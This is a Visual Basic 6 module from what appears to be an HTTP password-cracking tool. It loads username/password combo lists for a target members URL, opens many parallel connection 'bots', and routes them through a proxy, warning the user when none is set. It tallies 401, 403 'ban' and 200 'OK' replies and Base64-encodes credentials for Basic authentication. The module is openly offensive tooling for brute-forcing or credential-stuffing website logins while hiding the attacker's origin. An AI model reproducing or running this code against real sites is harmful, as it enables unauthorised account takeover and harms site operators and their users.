Attribute VB_Name = "mGlobal"
Option Explicit

'Play sound (See Function PlayWav)...
Public Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
    
Public strUser() As String         'Just username
Public strPass() As String         'Just password
Public userCount As Long           'Keep track of what login is next
Public login() As String           'user:pass combo

Public strURL As String            'Example: www.microsoft.com/members/ - URL of website
Public strRemoteHost As String     'Example: www.microsoft.com - Just the host (For when we use proxy)
Public strFilePath As String       'Example: /members/
Public HTTPResponse As String      'Holds reply from server
Public sessionComplete As Boolean  'Do i need to explain?

Public botTimeout As Long          'Store the reg setting for this so we don't have to keep accessing the registry
Public stopSession As Boolean      'This is set to false when the session is started. When user wants to stop session just set this to True
Public inSession As Boolean        'Another session traker
Public intFound As Long            'This is used for detecting fakes
Public intBan As Long              'This is used for detecting Forbidden reply's
Public intErr As Long              'Error counter

Public Function PlayWav(Snd As String)

    Dim PlayIt
    
    Snd = Snd
    PlayIt = sndPlaySound(Snd, 1)
    
End Function

Public Sub logIT(What As String, mColor As String, mText As RichTextBox)

    mText.SelStart = Len(mText)
    mText.SelColor = mColor
    mText.SelText = "> " & What & vbCrLf

End Sub

Public Sub DLogIT(What As String, mColor As String, mText As RichTextBox)
    
    frmDebug.Show , frmMain
    mText.SelStart = Len(mText)
    mText.SelColor = mColor
    mText.SelText = Now & " " & What & vbCrLf

End Sub

Public Sub startHTTP()

    Dim i As Long
    Dim intPort As Integer
    Dim listX As ListItem
    
    On Error GoTo Err
    
    'Check to see if they have proxy set. If not then ask if they want to continue...
    If GetSetting("TYPES", "CONFIG", "USEPROXY") = 0 Then
        If MsgBox("You have no proxy set!" & vbCrLf & "Are you sure you want to continue?", vbCritical + vbYesNo) = vbNo Then
            Exit Sub
        End If
    End If
    
    'Prepare session - variable's, etc.
    frmMain.mnuStop.Enabled = True
    inSession = True
    userCount = 0
    intFound = 0
    intBan = 0
    intErr = 0
    sessionComplete = False
    frmMain.pb1.Max = UBound(login) + 1
    frmMain.lvMain.ListItems.Clear
    frmMain.lvStatus.ListItems.Clear
    frmMain.tmrPercent.Enabled = True
    frmMain.tmrHPS.Enabled = True
    botTimeout = GetSetting("TYPES", "CONFIG", "TIMEOUT") & "000"
    frmMain.TabStrip1.Tabs(2).Selected = True
    frmMain.Toolbar1.Buttons(1).ButtonMenus(1).Enabled = False
    frmMain.Toolbar1.Buttons(1).ButtonMenus(3).Enabled = True
    stopSession = False
    frmMain.tmrFakes.Enabled = True
    frmMain.tmrBanned.Enabled = True
    
    'Update log...
    logIT "Session started: " & Now, &HFFFF&, frmMain.Output
    logIT "Address: " & strURL, &HFFFF&, frmMain.Output
    logIT "Logins: " & UBound(strUser) + 1, &HFFFF&, frmMain.Output
    If GetSetting("TYPES", "CONFIG", "USEPROXY") = 1 Then
        logIT "Using proxy: " & frmMain.lvProxy.SelectedItem.Text & ":" & frmMain.lvProxy.SelectedItem.ListSubItems(1).Text, &HFFFF&, frmMain.Output
    Else
        logIT "No proxy set!!!", &HFFFF&, frmMain.Output
    End If
    frmMain.StatusBar1.Panels(1).Text = "HTTP Session in progress..."
    
    'This is for the Session Stats. Tab...
    Set listX = frmMain.lvStatus.ListItems.Add
        listX.Text = "401 - Authorization required"
        listX.SubItems(1) = 0
        
    Set listX = frmMain.lvStatus.ListItems.Add
        listX.Text = "400 - Bad request"
        listX.SubItems(1) = 0
        
    Set listX = frmMain.lvStatus.ListItems.Add
        listX.Text = "404 - Not found"
        listX.SubItems(1) = 0
        
    Set listX = frmMain.lvStatus.ListItems.Add
        listX.Text = "Retries"
        listX.SubItems(1) = 0
        
    Set listX = frmMain.lvStatus.ListItems.Add
        listX.Text = "Unreconized response"
        listX.SubItems(1) = 0
        
    Set listX = frmMain.lvStatus.ListItems.Add
        listX.Text = "403 - Forbidden"
        listX.SubItems(1) = 0
        
    Set listX = frmMain.lvStatus.ListItems.Add
        listX.Text = "200 - OK!"
        listX.SubItems(1) = 0
        
    Set listX = frmMain.lvStatus.ListItems.Add
        listX.Text = "5xx"
        listX.SubItems(1) = 0
        
    Set listX = frmMain.lvStatus.ListItems.Add
        listX.Text = "Socket errors"
        listX.SubItems(1) = 0
        
    'Add URL to History...
    Set listX = frmMain.lvHistory.ListItems.Add
        listX.Text = strURL
        listX.SubItems(1) = "HTTP"
    
    'Now the good stuff...
    'First we see if the amount of logins that we have is less than
    'the amount of bots that the user wants to use.
    If UBound(login) + 1 < GetSetting("TYPES", "CONFIG", "BOTS") Then
        
        'If there are less logins than bots then just load
        'load bots to how ever many logins there are
        For i = 0 To UBound(login)
            
            Set listX = frmMain.lvMain.ListItems.Add(, , , , 1)
                listX.Text = i
                listX.SubItems(1) = "Connecting..."
                listX.SubItems(2) = login(i)
    
            If GetSetting("TYPES", "CONFIG", "USEPROXY") = 1 Then
                
                'Setup proxy...
                strRemoteHost = frmMain.lvProxy.SelectedItem.Text
                intPort = frmMain.lvProxy.SelectedItem.ListSubItems(1).Text
                strFilePath = strURL
                
                If Not Left(strFilePath, 7) = "http://" Then
                    strFilePath = "http://" & strFilePath
                End If
                
            Else
                
                'Don't use proxy...
                intPort = 80
                
                If Left(strURL, 7) = "http://" Then
                    strURL = Mid(strURL, 8)
                End If
                
                strRemoteHost = Left(strURL, InStr(1, strURL, "/") - 1)
                strFilePath = Mid(strURL, InStr(1, strURL, "/"))
            
            End If
            
            userCount = userCount + 1
            Load frmMain.tmrBot(i + 1)
            frmMain.tmrBot(i + 1).Interval = botTimeout
            frmMain.tmrBot(i + 1).Enabled = True
            Load frmMain.HTTPbot(i + 1)
            With frmMain.HTTPbot(i + 1)
                .Close
                .LocalPort = 0
                .Connect strRemoteHost, intPort
            End With
            
        Next i
    
    Else
        
        'Load bots for how ever many the user chose
        For i = 1 To GetSetting("TYPES", "CONFIG", "BOTS")
            
            Set listX = frmMain.lvMain.ListItems.Add(, , , , 1)
                listX.Text = i
                listX.SubItems(1) = "Connecting..."
                listX.SubItems(2) = login(i)

            If GetSetting("TYPES", "CONFIG", "USEPROXY") = 1 Then
                
                'Setup proxy...
                strRemoteHost = frmMain.lvProxy.SelectedItem.Text
                intPort = frmMain.lvProxy.SelectedItem.ListSubItems(1).Text
                strFilePath = strURL
                
                If Not Left(strFilePath, 7) = "http://" Then
                    strFilePath = "http://" & strFilePath
                End If
                
            Else
                
                'Don't use proxy...
                intPort = 80
                
                If Left(strURL, 7) = "http://" Then
                    strURL = Mid(strURL, 8)
                End If
                
                strRemoteHost = Left(strURL, InStr(1, strURL, "/") - 1)
                strFilePath = Mid(strURL, InStr(1, strURL, "/"))
            
            End If
            
            userCount = userCount + 1
            Load frmMain.tmrBot(i)
            frmMain.tmrBot(i).Interval = botTimeout
            frmMain.tmrBot(i).Enabled = True
            Load frmMain.HTTPbot(i)
            With frmMain.HTTPbot(i)
                .Close
                .LocalPort = 0
                .Connect strRemoteHost, intPort
            End With
            
        Next i
        
    End If
    
    Exit Sub
    
Err:
    
    MsgBox "The following error(s) have occured:" & vbCrLf & " - " & Err.Description & vbCrLf & vbCrLf & "Please check you settings and try again.", vbCritical
    inSession = False
    
End Sub

Public Function Base64_Encode(strSource) As String
   
    'I got this code from vbip.com's winsock tutorial
    
    Const BASE64_TABLE As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    '
    Dim strTempLine As String
    Dim j As Integer
    '
    For j = 1 To (Len(strSource) - Len(strSource) Mod 3) Step 3
        'Breake each 3 (8-bits) bytes to 4 (6-bits) bytes
        '
        '1 byte
        strTempLine = strTempLine + Mid(BASE64_TABLE, (Asc(Mid(strSource, j, 1)) \ 4) + 1, 1)
        '2 byte
        strTempLine = strTempLine + Mid(BASE64_TABLE, ((Asc(Mid(strSource, j, 1)) Mod 4) * 16 _
                       + Asc(Mid(strSource, j + 1, 1)) \ 16) + 1, 1)
        '3 byte
        strTempLine = strTempLine + Mid(BASE64_TABLE, ((Asc(Mid(strSource, j + 1, 1)) Mod 16) * 4 _
                       + Asc(Mid(strSource, j + 2, 1)) \ 64) + 1, 1)
        '4 byte
        strTempLine = strTempLine + Mid(BASE64_TABLE, (Asc(Mid(strSource, j + 2, 1)) Mod 64) + 1, 1)
    Next j
    '
    If Not (Len(strSource) Mod 3) = 0 Then
        '
        If (Len(strSource) Mod 3) = 2 Then
            '
            strTempLine = strTempLine + Mid(BASE64_TABLE, (Asc(Mid(strSource, j, 1)) \ 4) + 1, 1)
            '
            strTempLine = strTempLine + Mid(BASE64_TABLE, (Asc(Mid(strSource, j, 1)) Mod 4) * 16 _
                       + Asc(Mid(strSource, j + 1, 1)) \ 16 + 1, 1)
            '
            strTempLine = strTempLine + Mid(BASE64_TABLE, (Asc(Mid(strSource, j + 1, 1)) Mod 16) * 4 + 1, 1)
            '
            strTempLine = strTempLine & "="
            '
        ElseIf (Len(strSource) Mod 3) = 1 Then
            '
            '
            strTempLine = strTempLine + Mid(BASE64_TABLE, Asc(Mid(strSource, j, 1)) \ 4 + 1, 1)
            '
            strTempLine = strTempLine + Mid(BASE64_TABLE, (Asc(Mid(strSource, j, 1)) Mod 4) * 16 + 1, 1)
            '
            strTempLine = strTempLine & "=="
            '
        End If
        '
    End If
    '
    Base64_Encode = strTempLine
    '
End Function

Public Function Percent(Complete As Integer, Total As Variant, TotalOutput As Integer) As Integer

    On Error Resume Next
    Percent = Int(Complete / Total * 100)
    
End Function
